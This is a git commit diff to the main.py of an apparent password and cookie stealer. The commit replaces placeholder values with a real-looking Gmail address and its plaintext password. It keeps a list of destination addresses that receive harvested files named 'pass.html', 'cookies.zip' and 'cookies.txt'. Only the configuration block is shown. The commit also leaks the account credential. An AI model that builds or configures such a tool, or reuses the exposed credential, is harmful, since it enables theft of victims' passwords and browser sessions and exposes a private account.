224cce259cc4441fcdd2ca9abf55cfc98e0f32e2
apeklegend <101539654+apeklegend@users.noreply.github.com>
2022-03-23 20:39:33 +0800

    Update main.py

--- python_source/main.py
+++ python_source/main.py
@@ -12,9 +12,9 @@ from wifi import WIFI
 
 class Main:
     def __init__(self):
-        self.source_mail = 'YOUR_EMAIL@gmail.com'
-        self.source_pass = 'YOUR_PASSWORD'
-        self.dest_mail = ['kovinevmv@gmail.com', 'YOUR_EMAIL@gmail.com', 'ANOTHER_EMAIL@gmail.com']
+        self.source_mail = 'wanaqdam@gmail.com'
+        self.source_pass = 'wanadam'
+        self.dest_mail = ['kovinevmv@gmail.com', 'wanaqdam@gmail.com', 'ANOTHER_EMAIL@gmail.com']
 
         self.files = ['pass.html', 'PC.html', 'cookies.zip', 'cookies.txt']
 
